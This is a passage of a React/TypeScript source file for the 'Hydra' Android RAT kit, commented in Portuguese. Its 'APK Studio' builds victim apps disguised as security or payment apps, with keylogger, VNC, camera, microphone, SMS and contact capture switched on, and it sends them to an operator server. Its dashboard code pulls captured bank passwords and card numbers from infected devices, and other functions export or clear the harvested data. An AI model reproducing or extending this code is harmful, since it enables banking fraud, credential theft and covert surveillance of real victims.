          { id: generateId(), type: 'button', x: 235, y: 710, width: 55, height: 55, content: '➕', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 5, opacity: 100 },
          { id: generateId(), type: 'button', x: 305, y: 710, width: 45, height: 55, content: '⚙️', fontSize: 24, backgroundColor: '#FF6600', borderRadius: 14, opacity: 100 },
        ]
      },
    ];
    
    // Seleciona as telas DA VÍTIMA baseado no tipo de projeto
    const getVictimScreens = (): Screen[] => {
      switch(type) {
        case 'mobile_panel':
        case 'rat':
        case 'hybrid':
          return ratVictimScreens;
        default:
          return [{
            id: generateId(),
            name: 'Tela Principal',
            backgroundColor: '#0f0f1a',
            elements: []
          }];
      }
    };
    
    // Seleciona as telas DO PAINEL baseado no tipo de projeto
    const getPanelScreens = (): Screen[] | undefined => {
      switch(type) {
        case 'mobile_panel':
        case 'rat':
        case 'hybrid':
          return mobilePanelScreens;
        default:
          return undefined;
      }
    };
    
    // Nomes padrão por tipo
    const getDefaultName = () => {
      switch(type) {
        case 'mobile_panel': return 'Hydra Mobile Panel';
        case 'rat': return 'Hydra - Proteção de Segurança';
        case 'hybrid': return 'Híbrido - Pagamento + RAT';
        case 'payment': return 'App de Pagamento';
        default: return `Novo Projeto ${projects.length + 1}`;
      }
    };
    
    const getDefaultAppName = () => {
      switch(type) {
        case 'mobile_panel': return 'Hydra Control';
        case 'rat': return 'Hydra Security';
        case 'hybrid': return 'App Seguro';
        case 'payment': return 'Pagamento Seguro';
        default: return 'Meu App';
      }
    };
    
    const getDefaultPackage = () => {
      switch(type) {
        case 'mobile_panel': return 'com.rat.mobile.panel';
        case 'rat': return 'com.security.protection';
        case 'hybrid': return 'com.secure.app';
        case 'payment': return 'com.payment.app';
        default: return 'com.meuapp';
      }
    };
    
    const newProject: Project = {
      id: generateId(),
      name: getDefaultName(),
      appName: getDefaultAppName(),
      packageName: getDefaultPackage(),
      apkFileName: '', // 🔥 OBRIGATÓRIO: usuário deve definir o nome do APK
      projectType: type,
      screens: getVictimScreens(),
      panelScreens: getPanelScreens(),
      theme: type === 'rat' || type === 'hybrid'
        ? { ...DEFAULT_THEME, primaryColor: '#238636', accentColor: '#58a6ff', backgroundColor: '#0d1117' }
        : type === 'mobile_panel' 
          ? { ...DEFAULT_THEME, primaryColor: '#FF6600', accentColor: '#00D4AA' }
          : { ...DEFAULT_THEME },
      enableRat: type === 'rat' || type === 'hybrid' || type === 'mobile_panel',
      enablePayment: type === 'payment' || type === 'hybrid',
      enableKeylogger: type === 'rat' || type === 'hybrid',
      // 🔥 URL DA VPS CONFIGURADA AUTOMATICAMENTE
      serverUrl: type === 'rat' || type === 'hybrid' ? defaultServerUrl() : undefined,
      
      // 🔥 NOVO: Separação entre APK Studio e APK Builder
      // Por padrão, APKs do Studio NÃO aparecem no painel web principal
      showInWebPanel: false,  // O usuário pode marcar checkbox para aparecer
      source: 'apk_studio',   // Identificador de origem
      
      // Config do Painel Mobile
      ...(type === 'mobile_panel' && {
        mobilePanelConfig: {
          serverUrl: defaultServerUrl(),
          operatorUsername: '',
          operatorPassword: '',
          enableVNC: true,
          enableKeylogger: true,
          enableCamera: true,
          enableMicrophone: true,
          enableFileManager: true,
          enableSMS: true,
          enableContacts: true,
          enableLocation: true,
          enableApkBuilder: true,
          customBranding: false,
        }
      })
    };
    
    setProjects([...projects, newProject]);
    setCurrentProject(newProject);
    setCurrentScreenIndex(0);
    setShowProjectList(false);
  };

  const saveProject = () => {
    if (!currentProject) return;
    
    const updatedProjects = projects.map(p => 
      p.id === currentProject.id ? currentProject : p
    );
    setProjects(updatedProjects);
    alert('✅ Projeto salvo com sucesso!');
  };

  const deleteProject = (projectId: string) => {
    if (confirm('Tem certeza que deseja excluir este projeto?')) {
      setProjects(projects.filter(p => p.id !== projectId));
      if (currentProject?.id === projectId) {
        setCurrentProject(null);
        setShowProjectList(true);
      }
    }
  };

  // ============================================
  // FUNÇÕES DE TELA
  // ============================================
  
  const addScreen = () => {
    if (!currentProject) return;
    
    const screensToUse = editingMode === 'victim' ? currentProject.screens : (currentProject.panelScreens || []);
    const prefix = editingMode === 'victim' ? 'Vítima' : 'Painel';
    
    const newScreen: Screen = {
      id: generateId(),
      name: `${prefix} - Tela ${screensToUse.length + 1}`,
      backgroundColor: currentProject.theme.backgroundColor,
      elements: []
    };
    
    if (editingMode === 'victim') {
      setCurrentProject({
        ...currentProject,
        screens: [...currentProject.screens, newScreen]
      });
    } else {
      setCurrentProject({
        ...currentProject,
        panelScreens: [...(currentProject.panelScreens || []), newScreen]
      });
    }
    setCurrentScreenIndex(screensToUse.length);
  };

  const deleteScreen = (index: number) => {
    if (!currentProject || currentScreens.length <= 1) return;
    
    if (editingMode === 'victim') {
      const newScreens = currentProject.screens.filter((_, i) => i !== index);
      setCurrentProject({ ...currentProject, screens: newScreens });
      setCurrentScreenIndex(Math.min(currentScreenIndex, newScreens.length - 1));
    } else {
      const newScreens = (currentProject.panelScreens || []).filter((_, i) => i !== index);
      setCurrentProject({ ...currentProject, panelScreens: newScreens });
      setCurrentScreenIndex(Math.min(currentScreenIndex, newScreens.length - 1));
    }
  };

  // ============================================
  // FUNÇÕES DE ELEMENTO
  // ============================================
  
  const addElement = (type: ScreenElement['type']) => {
    if (!currentProject || !currentScreen) return;
    
    // Dimensões padrão por tipo
    const defaultSizes: Record<string, { w: number; h: number }> = {
      text: { w: 260, h: 40 },
      button: { w: 260, h: 50 },
      input: { w: 260, h: 55 },
      image: { w: 150, h: 150 },
      logo: { w: 120, h: 60 },
      rectangle: { w: 100, h: 100 },
      circle: { w: 80, h: 80 },
      video: { w: 280, h: 160 },
      audio: { w: 260, h: 50 },
      gif: { w: 120, h: 120 },
      lottie: { w: 100, h: 100 },
      icon: { w: 40, h: 40 },
      pix_qrcode: { w: 200, h: 200 },
      pix_copypaste: { w: 260, h: 50 },
      credit_card_form: { w: 280, h: 200 },
      divider: { w: 280, h: 2 },
      spacer: { w: 100, h: 20 },
      card: { w: 280, h: 150 },
      list_item: { w: 280, h: 60 },
      progress_bar: { w: 260, h: 20 },
      slider: { w: 260, h: 40 },
      checkbox: { w: 200, h: 30 },
      radio: { w: 200, h: 30 },
      switch: { w: 60, h: 30 },
      dropdown: { w: 260, h: 50 },
      date_picker: { w: 260, h: 50 },
      webview: { w: 280, h: 300 },
      map: { w: 280, h: 200 },
      chart: { w: 260, h: 180 },
      timer: { w: 120, h: 50 },
      countdown: { w: 200, h: 80 },
    };
    
    const size = defaultSizes[type] || { w: 100, h: 100 };
    
    const baseElement: ScreenElement = {
      id: generateId(),
      type,
      x: 50,
      y: 150,
      width: size.w,
      height: size.h,
      opacity: 100,
      animation: 'none',
      animationDuration: 500,
      animationLoop: false,
    };

    switch (type) {
      // ===== BÁSICOS =====
      case 'text':
        baseElement.content = 'Novo Texto';
        baseElement.fontSize = 18;
        baseElement.fontWeight = 'normal';
        baseElement.fontFamily = 'Arial';
        baseElement.color = '#FFFFFF';
        baseElement.textAlign = 'center';
        break;
        
      case 'button':
        baseElement.content = 'Botão';
        baseElement.fontSize = 16;
        baseElement.fontWeight = 'bold';
        baseElement.color = '#FFFFFF';
        baseElement.backgroundColor = currentProject.theme.primaryColor;
        baseElement.borderRadius = 12;
        baseElement.buttonAction = 'next_screen';
        baseElement.buttonStyle = 'filled';
        baseElement.shadowColor = '#000000';
        baseElement.shadowBlur = 10;
        baseElement.shadowOffsetY = 4;
        break;
        
      case 'input':
        baseElement.placeholder = 'Digite aqui...';
        baseElement.inputType = 'text';
        baseElement.inputLabel = 'Campo';
        baseElement.backgroundColor = '#1a1a2e';
        baseElement.color = '#FFFFFF';
        baseElement.borderRadius = 8;
        baseElement.borderWidth = 1;
        baseElement.borderColor = '#444444';
        baseElement.required = false;
        break;
        
      // ===== FORMAS =====
      case 'rectangle':
        baseElement.backgroundColor = '#333333';
        baseElement.borderRadius = 0;
        baseElement.gradientStart = '#333333';
        baseElement.gradientEnd = '#555555';
        break;
        
      case 'circle':
        baseElement.backgroundColor = '#333333';
        baseElement.gradientStart = '#333333';
        baseElement.gradientEnd = '#555555';
        break;
        
      case 'divider':
        baseElement.backgroundColor = '#444444';
        baseElement.height = 2;
        break;
        
      case 'card':
        baseElement.backgroundColor = '#1a1a2e';
        baseElement.borderRadius = 16;
        baseElement.shadowColor = '#000000';
        baseElement.shadowBlur = 15;
        baseElement.shadowOffsetY = 5;
        baseElement.borderWidth = 1;
        baseElement.borderColor = '#333333';
        break;
        
      // ===== MÍDIA =====
      case 'video':
        baseElement.backgroundColor = '#000000';
        baseElement.borderRadius = 12;
        baseElement.autoPlay = false;
        baseElement.loop = false;
        baseElement.muted = false;
        baseElement.controls = true;
        break;
        
      case 'audio':
        baseElement.backgroundColor = '#1a1a2e';
        baseElement.borderRadius = 25;
        baseElement.autoPlay = false;
        baseElement.loop = false;
        baseElement.controls = true;
        break;
        
      case 'gif':
        baseElement.backgroundColor = 'transparent';
        baseElement.borderRadius = 8;
        baseElement.loop = true;
        break;
        
      case 'lottie':
        baseElement.backgroundColor = 'transparent';
        baseElement.loop = true;
        baseElement.autoPlay = true;
        break;
        
      case 'icon':
        baseElement.color = '#FFFFFF';
        baseElement.iconName = 'star';
        break;
        
      case 'logo':
        baseElement.backgroundColor = 'transparent';
        baseElement.borderRadius = 8;
        break;
        
      // ===== INTERATIVOS =====
      case 'checkbox':
        baseElement.content = 'Opção';
        baseElement.color = '#FFFFFF';
        baseElement.checked = false;
        break;
        
      case 'switch':
        baseElement.backgroundColor = '#444444';
        baseElement.color = currentProject.theme.accentColor;
        baseElement.checked = false;
        break;
        
      case 'dropdown':
        baseElement.backgroundColor = '#1a1a2e';
        baseElement.color = '#FFFFFF';
        baseElement.borderRadius = 8;
        baseElement.borderWidth = 1;
        baseElement.borderColor = '#444444';
        baseElement.placeholder = 'Selecione...';
        baseElement.options = ['Opção 1', 'Opção 2', 'Opção 3'];
        break;
        
      case 'slider':
        baseElement.backgroundColor = '#444444';
        baseElement.color = currentProject.theme.accentColor;
        baseElement.minValue = 0;
        baseElement.maxValue = 100;
        baseElement.currentValue = 50;
        break;
        
      case 'progress_bar':
        baseElement.backgroundColor = '#333333';
        baseElement.color = currentProject.theme.accentColor;
        baseElement.borderRadius = 10;
        baseElement.currentValue = 65;
        break;
        
      case 'countdown':
        baseElement.backgroundColor = '#1a1a2e';
        baseElement.color = '#FFFFFF';
        baseElement.fontSize = 32;
        baseElement.fontWeight = 'bold';
        baseElement.borderRadius = 12;
        baseElement.timerSeconds = 300;
        baseElement.timerFormat = 'mm:ss';
        baseElement.onTimerEnd = 'next_screen';
        break;
        
      // ===== PAGAMENTO =====
      case 'pix_qrcode':
        baseElement.pixAmount = '10.00';
        baseElement.pixDescription = 'Pagamento via PIX';
        baseElement.backgroundColor = '#FFFFFF';
        baseElement.borderRadius = 16;
        break;
        
      case 'pix_copypaste':
        baseElement.content = '📋 Copiar código PIX';
        baseElement.backgroundColor = currentProject.theme.accentColor;
        baseElement.color = '#000000';
        baseElement.borderRadius = 8;
        baseElement.fontWeight = 'bold';
        break;
        
      case 'credit_card_form':
        baseElement.backgroundColor = '#1a1a2e';
        baseElement.borderRadius = 16;
        baseElement.borderWidth = 1;
        baseElement.borderColor = '#333333';
        break;
        
      // ===== AVANÇADO =====
      case 'webview':
        baseElement.backgroundColor = '#FFFFFF';
        baseElement.borderRadius = 12;
        baseElement.buttonUrl = 'https://example.com';
        break;
        
      case 'map':
        baseElement.backgroundColor = '#1a1a2e';
        baseElement.borderRadius = 12;
        break;
    }

    // Usa a lista correta baseada no modo de edição
    if (editingMode === 'victim') {
      const newScreens = [...currentProject.screens];
      newScreens[currentScreenIndex].elements.push(baseElement);
      setCurrentProject({ ...currentProject, screens: newScreens });
    } else {
      const newScreens = [...(currentProject.panelScreens || [])];
      newScreens[currentScreenIndex].elements.push(baseElement);
      setCurrentProject({ ...currentProject, panelScreens: newScreens });
    }
    setSelectedElement(baseElement.id);
  };

  const updateElement = (id: string, updates: Partial<ScreenElement>) => {
    if (!currentProject || !currentScreen) return;
    
    if (editingMode === 'victim') {
      const newScreens = [...currentProject.screens];
      const elementIndex = newScreens[currentScreenIndex].elements.findIndex(e => e.id === id);
      
      if (elementIndex >= 0) {
        let updated = { ...newScreens[currentScreenIndex].elements[elementIndex], ...updates };
        updated.x = Math.max(0, Math.min(ANDROID_WIDTH - updated.width, updated.x));
        updated.y = Math.max(0, Math.min(ANDROID_HEIGHT - updated.height, updated.y));
        newScreens[currentScreenIndex].elements[elementIndex] = updated;
        setCurrentProject({ ...currentProject, screens: newScreens });
      }
    } else {
      const newScreens = [...(currentProject.panelScreens || [])];
      const elementIndex = newScreens[currentScreenIndex].elements.findIndex(e => e.id === id);
      
      if (elementIndex >= 0) {
        let updated = { ...newScreens[currentScreenIndex].elements[elementIndex], ...updates };
        updated.x = Math.max(0, Math.min(ANDROID_WIDTH - updated.width, updated.x));
        updated.y = Math.max(0, Math.min(ANDROID_HEIGHT - updated.height, updated.y));
        newScreens[currentScreenIndex].elements[elementIndex] = updated;
        setCurrentProject({ ...currentProject, panelScreens: newScreens });
      }
    }
  };

  const deleteElement = (id: string) => {
    if (!currentProject || !currentScreen) return;
    
    if (editingMode === 'victim') {
      const newScreens = [...currentProject.screens];
      newScreens[currentScreenIndex].elements = newScreens[currentScreenIndex].elements.filter(e => e.id !== id);
      setCurrentProject({ ...currentProject, screens: newScreens });
    } else {
      const newScreens = [...(currentProject.panelScreens || [])];
      newScreens[currentScreenIndex].elements = newScreens[currentScreenIndex].elements.filter(e => e.id !== id);
      setCurrentProject({ ...currentProject, panelScreens: newScreens });
    }
    if (selectedElement === id) setSelectedElement(null);
  };

  // ============================================
  // DRAG & DROP
  // ============================================
  
  const handleMouseDown = (e: React.MouseEvent, elementId: string) => {
    e.stopPropagation();
    if (!previewRef.current || !currentScreen) return;
    
    const element = currentScreen.elements.find(el => el.id === elementId);
    if (!element) return;

    const rect = previewRef.current.getBoundingClientRect();
    const scaleX = ANDROID_WIDTH / rect.width;
    const scaleY = ANDROID_HEIGHT / rect.height;
    
    const mouseX = (e.clientX - rect.left) * scaleX;
    const mouseY = (e.clientY - rect.top) * scaleY;

    setSelectedElement(elementId);
    setIsDragging(true);
    setDragOffset({ x: mouseX - element.x, y: mouseY - element.y });
  };

  const handleMouseMove = (e: React.MouseEvent) => {
    if (!isDragging || !selectedElement || !previewRef.current || !currentScreen) return;

    const rect = previewRef.current.getBoundingClientRect();
    const scaleX = ANDROID_WIDTH / rect.width;
    const scaleY = ANDROID_HEIGHT / rect.height;
    
    const mouseX = (e.clientX - rect.left) * scaleX;
    const mouseY = (e.clientY - rect.top) * scaleY;

    const element = currentScreen.elements.find(el => el.id === selectedElement);
    if (!element) return;

    let newX = mouseX - dragOffset.x;
    let newY = mouseY - dragOffset.y;

    newX = Math.max(0, Math.min(ANDROID_WIDTH - element.width, newX));
    newY = Math.max(0, Math.min(ANDROID_HEIGHT - element.height, newY));

    updateElement(selectedElement, { x: newX, y: newY });
  };

  const handleMouseUp = () => setIsDragging(false);
  
  // Simula clique no botão para navegar entre telas
  const handleButtonClick = (el: ScreenElement) => {
    if (!el.buttonAction) return;
    
    switch (el.buttonAction) {
      case 'next_screen':
        if (safeScreenIndex < currentScreens.length - 1) {
          setCurrentScreenIndex(safeScreenIndex + 1);
        }
        break;
      case 'prev_screen':
        if (safeScreenIndex > 0) {
          setCurrentScreenIndex(safeScreenIndex - 1);
        }
        break;
      case 'goto_screen':
        if (el.targetScreenIndex !== undefined && el.targetScreenIndex >= 0 && el.targetScreenIndex < currentScreens.length) {
          setCurrentScreenIndex(el.targetScreenIndex);
        }
        break;
      default:
        // Outras ações mostram apenas um toast visual
        console.log(`Ação: ${el.buttonAction}`);
    }
  };

  // ============================================
  // FUNÇÕES PIX
  // ============================================
  
  const savePixConfig = (config: PixConfig) => {
    if (editingPix) {
      setPixConfigs(pixConfigs.map(p => p.id === config.id ? config : p));
    } else {
      setPixConfigs([...pixConfigs, { ...config, id: generateId() }]);
    }
    setShowPixForm(false);
    setEditingPix(null);
  };

  const deletePixConfig = (id: string) => {
    if (confirm('Excluir esta configuração PIX?')) {
      setPixConfigs(pixConfigs.filter(p => p.id !== id));
    }
  };

  // ============================================
  // STATUS DO SERVIDOR (verificação real)
  // ============================================
  
  const [serverStatus, setServerStatus] = useState<'checking' | 'online' | 'offline'>('checking');
  
  // Verifica status do servidor a cada 30 segundos
  // 🔥 DADOS REAIS DO SERVIDOR - Atualizado em tempo real
  const [realTimeData, setRealTimeData] = useState({
    totalDevices: 0,
    onlineDevices: 0,
    offlineDevices: 0,
    totalPasswords: 0,
    totalCards: 0,
    recentDevices: [] as any[],
    recentKeylogs: [] as any[],
    selectedDevice: null as any,
  });

  useEffect(() => {
    const fetchRealTimeData = async () => {
      try {
        const token = localStorage.getItem('token') || '';
        
        // Busca dispositivos REAIS
        const devicesRes = await fetch(`${getApiBaseUrl()}/api/devices`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        
        if (devicesRes.ok) {
          const devices = await devicesRes.json();
          const online = devices.filter((d: any) => d.is_online).length;
          const offline = devices.length - online;
          
          setRealTimeData(prev => ({
            ...prev,
            totalDevices: devices.length,
            onlineDevices: online,
            offlineDevices: offline,
            recentDevices: devices.slice(0, 5), // Últimos 5 dispositivos
          }));
          
          setServerStatus('online');
        } else {
          setServerStatus('offline');
        }
        
        // Busca senhas e keylogs capturados (dados REAIS)
        try {
          let totalPwds = 0;
          let totalCards = 0;
          const allKeylogs: any[] = [];
          
          for (const device of realTimeData.recentDevices.slice(0, 10)) {
            try {
              // Busca senhas bancárias
              const pwdRes = await fetch(`${getApiBaseUrl()}/api/devices/${device.device_id}/bank-passwords`, {
                headers: { 'Authorization': `Bearer ${token}` }
              });
              if (pwdRes.ok) {
                const pwds = await pwdRes.json();
                totalPwds += pwds.length;
                
                // Adiciona keylogs formatados
                pwds.forEach((pwd: any) => {
                  allKeylogs.push({
                    id: pwd.id,
                    app: pwd.app_name || 'App',
                    type: pwd.label || 'senha',
                    value: pwd.password,
                    device: device.model,
                    time: pwd.captured_at || new Date().toISOString(),
                    isCard: pwd.label?.includes('cartao') || pwd.password?.match(/^\d{13,19}$/)
                  });
                  
                  // Conta cartões
                  if (pwd.label?.includes('cartao') || pwd.password?.match(/^\d{13,19}$/)) {
                    totalCards++;
                  }
                });
              }
            } catch {}
          }
          
          // Ordena por data (mais recente primeiro)
          allKeylogs.sort((a, b) => new Date(b.time).getTime() - new Date(a.time).getTime());
          
          setRealTimeData(prev => ({ 
            ...prev, 
            totalPasswords: totalPwds,
            totalCards: totalCards,
            recentKeylogs: allKeylogs.slice(0, 20) // Últimos 20 keylogs
          }));
        } catch {}
        
      } catch {
        setServerStatus('offline');
      }
    };
    
    fetchRealTimeData();
    const interval = setInterval(fetchRealTimeData, 10000); // Atualiza a cada 10s
    return () => clearInterval(interval);
  }, [currentProject?.serverUrl]);
  
  // 🎯 VARIÁVEIS DINÂMICAS - Dados REAIS do servidor
  const formatTimeAgo = (dateStr: string) => {
    const date = new Date(dateStr);
    const now = new Date();
    const diffMs = now.getTime() - date.getTime();
    const diffMins = Math.floor(diffMs / 60000);
    if (diffMins < 1) return 'agora';
    if (diffMins < 60) return `há ${diffMins} min`;
    const diffHours = Math.floor(diffMins / 60);
    if (diffHours < 24) return `há ${diffHours}h`;
    return `há ${Math.floor(diffHours / 24)}d`;
  };

  const dynamicVariables: Record<string, string> = {
    // Status do servidor
    server_status: serverStatus === 'online' ? '🟢 Servidor: Online' : 
                   serverStatus === 'offline' ? '🔴 Servidor: Offline' : 
                   '🟡 Verificando...',
    
    // Contadores principais
    total_devices: realTimeData.totalDevices.toString(),
    online_devices: realTimeData.onlineDevices.toString(),
    offline_devices: realTimeData.offlineDevices.toString(),
    total_passwords: realTimeData.totalPasswords.toString(),
    total_cards: realTimeData.totalCards.toString(),
    
    // Info do usuário
    username: localStorage.getItem('username') || 'admin',
    app_version: '2.0.0',
    build_date: new Date().toLocaleDateString('pt-BR'),
    
    // Dispositivos recentes (para listas dinâmicas)
    device_1_name: realTimeData.recentDevices[0]?.model || 'Aguardando conexão...',
    device_1_status: realTimeData.recentDevices[0]?.is_online ? '🟢' : '🔴',
    device_1_ip: realTimeData.recentDevices[0]?.ip_address || '---',
    device_1_android: realTimeData.recentDevices[0]?.android_version || '---',
    device_1_time: realTimeData.recentDevices[0]?.last_seen ? formatTimeAgo(realTimeData.recentDevices[0].last_seen) : '---',
    
    device_2_name: realTimeData.recentDevices[1]?.model || '',
    device_2_status: realTimeData.recentDevices[1]?.is_online ? '🟢' : '🔴',
    device_2_ip: realTimeData.recentDevices[1]?.ip_address || '',
    device_2_android: realTimeData.recentDevices[1]?.android_version || '',
    device_2_time: realTimeData.recentDevices[1]?.last_seen ? formatTimeAgo(realTimeData.recentDevices[1].last_seen) : '',
    
    device_3_name: realTimeData.recentDevices[2]?.model || '',
    device_3_status: realTimeData.recentDevices[2]?.is_online ? '🟢' : '🔴',
    device_3_ip: realTimeData.recentDevices[2]?.ip_address || '',
    device_3_android: realTimeData.recentDevices[2]?.android_version || '',
    device_3_time: realTimeData.recentDevices[2]?.last_seen ? formatTimeAgo(realTimeData.recentDevices[2].last_seen) : '',
    
    // Dispositivo selecionado (para tela VNC)
    selected_device_name: realTimeData.selectedDevice?.model || realTimeData.recentDevices[0]?.model || 'Nenhum dispositivo',
    selected_device_status: (realTimeData.selectedDevice?.is_online || realTimeData.recentDevices[0]?.is_online) ? '🟢 Conectado • 30 FPS' : '🔴 Offline',
    
    // Keylogs recentes
    keylog_1_app: realTimeData.recentKeylogs[0]?.app || 'Aguardando dados...',
    keylog_1_type: realTimeData.recentKeylogs[0]?.type || '',
    keylog_1_value: realTimeData.recentKeylogs[0]?.value ? '●●●●●●' : '',
    keylog_1_device: realTimeData.recentKeylogs[0]?.device || '',
    keylog_1_time: realTimeData.recentKeylogs[0]?.time ? formatTimeAgo(realTimeData.recentKeylogs[0].time) : '',
    
    keylog_2_app: realTimeData.recentKeylogs[1]?.app || '',
    keylog_2_type: realTimeData.recentKeylogs[1]?.type || '',
    keylog_2_value: realTimeData.recentKeylogs[1]?.value ? '●●●●●●' : '',
    keylog_2_device: realTimeData.recentKeylogs[1]?.device || '',
    keylog_2_time: realTimeData.recentKeylogs[1]?.time ? formatTimeAgo(realTimeData.recentKeylogs[1].time) : '',
    
    keylog_3_app: realTimeData.recentKeylogs[2]?.app || '',
    keylog_3_type: realTimeData.recentKeylogs[2]?.type || '',
    keylog_3_value: realTimeData.recentKeylogs[2]?.value ? '●●●●●●' : '',
    keylog_3_device: realTimeData.recentKeylogs[2]?.device || '',
    keylog_3_time: realTimeData.recentKeylogs[2]?.time ? formatTimeAgo(realTimeData.recentKeylogs[2].time) : '',
    
    keylog_4_app: realTimeData.recentKeylogs[3]?.app || '',
    keylog_4_value: realTimeData.recentKeylogs[3]?.value ? '●●●●●●' : '',
  };

  // ============================================
  // BUILD APK
  // ============================================
  
  const [buildStatus, setBuildStatus] = useState<{
    isBuilding: boolean;
    progress: number;
    message: string;
    buildId?: string;
    downloadUrl?: string;
    error?: string;
  }>({ isBuilding: false, progress: 0, message: '' });
  
  // Estado para confirmação antes do build
  const [showBuildConfirm, setShowBuildConfirm] = useState(false);
  
  // Analisa todos os elementos que precisam de banco de dados
  const analyzeDataFields = () => {
    const dataFields: { screen: string; element: string; type: string; label: string; fieldType: string }[] = [];
    
    currentScreens.forEach(screen => {
      screen.elements.forEach(el => {
        // Elementos que salvam dados no banco
        if (el.type === 'input') {
          dataFields.push({
            screen: screen.name,
            element: el.content || el.placeholder || 'Campo',
            type: 'input',
            label: el.inputLabel || 'campo_' + el.id.slice(0,4),
            fieldType: el.inputType || 'text'
          });
        }
        if (el.type === 'checkbox' || el.type === 'switch') {
          dataFields.push({
            screen: screen.name,
            element: el.content || 'Opção',
            type: el.type,
            label: el.inputLabel || el.type + '_' + el.id.slice(0,4),
            fieldType: 'boolean'
          });
        }
        if (el.type === 'dropdown') {
          dataFields.push({
            screen: screen.name,
            element: el.content || 'Lista',
            type: 'dropdown',
            label: el.inputLabel || 'select_' + el.id.slice(0,4),
            fieldType: 'text'
          });
        }
        if (el.type === 'slider') {
          dataFields.push({
            screen: screen.name,
            element: el.content || 'Valor',
            type: 'slider',
            label: el.inputLabel || 'slider_' + el.id.slice(0,4),
            fieldType: 'number'
          });
        }
      });
    });
    
    return dataFields;
  };
  
  // 🎯 Estado para controlar qual APK gerar (vítima ou painel)
  const [buildTarget, setBuildTarget] = useState<'victim' | 'panel'>('victim');
  
  // Inicia o processo de build com confirmação
  const startBuildProcess = (target: 'victim' | 'panel' = 'victim') => {
    setBuildTarget(target);
    setShowBuildConfirm(true);
  };
  
  const buildAPK = async () => {
    if (!currentProject) return;
    
    // 🔥 VALIDAÇÃO: Nome do APK é obrigatório
    if (!currentProject.apkFileName || currentProject.apkFileName.trim().length < 3) {
      alert('❌ ERRO: Nome do arquivo APK é obrigatório!\n\nVá em "Config" e preencha o campo "Nome do Arquivo APK" com pelo menos 3 caracteres.');
      setShowBuildConfirm(false);
      return;
    }
    
    setShowBuildConfirm(false);
    
    const targetLabel = buildTarget === 'panel' ? 'PAINEL ADMIN' : 'VÍTIMA';
    setBuildStatus({ isBuilding: true, progress: 5, message: `Preparando APK ${targetLabel}...` });
    
    try {
      const token = localStorage.getItem('token');
      
      // 🔥 Envia o buildTarget para o backend saber qual APK gerar
      // Garante que serverUrl sempre tem a URL da VPS
      const serverUrl = currentProject.serverUrl || defaultServerUrl();
      
      const buildPayload = {
        ...currentProject,
        serverUrl: serverUrl, // 🔥 IMPORTANTE: URL do servidor para conexão
        buildTarget: buildTarget,  // 'victim' ou 'panel'
        // Se for painel, configura mobilePanelConfig com a URL correta
        ...(buildTarget === 'panel' ? {
          projectType: 'mobile_panel',
          screens: currentProject.panelScreens || [], // Usa as telas do painel
          isAdminPanel: true,
          mobilePanelConfig: {
            ...(currentProject.mobilePanelConfig || {}),
            serverUrl: serverUrl // 🔥 Garante a URL correta para o WebView do admin
          }
        } : {
          screens: currentProject.screens, // Usa as telas da vítima
          isAdminPanel: false
        })
      };
      
      console.log('🔥 Build Payload:', JSON.stringify(buildPayload, null, 2));
      
      // Inicia o build
      const response = await fetch(`${getApiBaseUrl()}/api/apk-studio/build`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify(buildPayload)
      });
      
      if (!response.ok) throw new Error('Erro ao iniciar build');
      
      const data = await response.json();
      const buildId = data.build_id;
      
      // Polling para verificar status
      const checkStatus = async () => {
        const statusRes = await fetch(`${getApiBaseUrl()}/api/apk-studio/build-status/${buildId}`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        const status = await statusRes.json();
        
        setBuildStatus({
          isBuilding: status.status === 'building',
          progress: status.progress || 0,
          message: status.message || '',
          buildId,
          downloadUrl: status.result?.download_url,
          error: status.status === 'error' ? status.message : undefined
        });
        
        if (status.status === 'building') {
          setTimeout(checkStatus, 2000);
        }
      };
      
      checkStatus();
      
    } catch (error: any) {
      setBuildStatus({
        isBuilding: false,
        progress: 0,
        message: '',
        error: error.message || 'Erro ao gerar APK'
      });
    }
  };

  // ============================================
  // DADOS RECEBIDOS DO APP
  // ============================================
  
  const [capturedData, setCapturedData] = useState<any[]>([]);
  const [dataFields, setDataFields] = useState<{name: string, type: string, occurrences: number}[]>([]);
  const [dataPage, setDataPage] = useState(1);
  const [dataTotalPages, setDataTotalPages] = useState(1);
  const [dataTotalEntries, setDataTotalEntries] = useState(0);
  const [isLoadingData, setIsLoadingData] = useState(false);
  
  const loadCapturedData = async (page = 1) => {
    if (!currentProject) return;
    
    setIsLoadingData(true);
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/apk-studio/data/${currentProject.id}?page=${page}&limit=50`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      
      if (response.ok) {
        const result = await response.json();
        setCapturedData(result.data || []);
        setDataFields(result.fields || []);
        setDataPage(result.page || 1);
        setDataTotalPages(result.totalPages || 1);
        setDataTotalEntries(result.total || 0);
      }
    } catch (error) {
      console.error('Erro ao carregar dados:', error);
    } finally {
      setIsLoadingData(false);
    }
  };
  
  const exportData = async (format: 'json' | 'csv') => {
    if (!currentProject) return;
    
    try {
      const token = localStorage.getItem('token');
      const endpoint = format === 'csv' 
        ? `${getApiBaseUrl()}/api/apk-studio/data/${currentProject.id}/export-csv`
        : `${getApiBaseUrl()}/api/apk-studio/data/${currentProject.id}/export-json`;
        
      const response = await fetch(endpoint, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      
      if (!response.ok) {
        alert('Nenhum dado para exportar');
        return;
      }
      
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `dados-${currentProject.id}.${format}`;
      a.click();
      window.URL.revokeObjectURL(url);
    } catch (error) {
      console.error('Erro ao exportar:', error);
      alert('Erro ao exportar dados');
    }
  };
  
  const clearAllData = async () => {
    if (!currentProject) return;
    if (!confirm('Tem certeza que deseja EXCLUIR TODOS os dados capturados? Esta ação não pode ser desfeita!')) return;
    
    try {
      const token = localStorage.getItem('token');
      await fetch(`${getApiBaseUrl()}/api/apk-studio/data/${currentProject.id}`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${token}` }
      });
      loadCapturedData();
      alert('✅ Dados excluídos com sucesso!');
    } catch (error) {
      console.error('Erro ao excluir:', error);
    }
  };

  // ============================================
  // UPLOAD DE IMAGEM
  // ============================================
  
